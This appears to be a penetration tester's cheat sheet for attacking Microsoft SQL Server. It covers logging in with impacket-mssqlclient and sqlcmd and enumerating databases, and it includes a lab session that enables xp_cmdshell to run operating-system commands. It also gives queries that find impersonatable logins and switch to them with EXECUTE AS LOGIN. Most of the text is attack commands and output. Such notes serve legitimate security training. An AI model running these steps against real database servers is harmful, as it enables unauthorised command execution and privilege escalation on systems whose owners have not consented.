`impacket-mssqlclient '<user>':'<pass>'@<ip_address> -port <port> -windows-auth

for domain auth (might not need)
`impacket-mssqlclient <domain>/<user>:'<pass>'@<ip_address> -port <port> -windows-auth

From windows:
`sqlcmd /S <servername> /d <database> -U <user> -p <pass>`

try this first
	enable_xp_cmdshell

Enumeration
	See [[0 SQL Theory and Databases]]
	also
	PayloadAllTheThings

Enumeration Summary
```
# View Databases:

SELECT name FROM sys.databases;
	Defaults:
		master
		tempdb
		model
		msdb

# View Tables:

SELECT * FROM <database>.information_schema.tables;


# View Entries in Tables:

SELECT * FROM <database>.<table_schema>.<table_name>;

```

Enable xp_cmdshell
```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

Use commands with xp_cmdshell
```
EXECUTE xp_cmdshell '<command>';
```

Impersonate users 
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'  
	will display user

EXECUTE AS LOGIN = '<user>'

```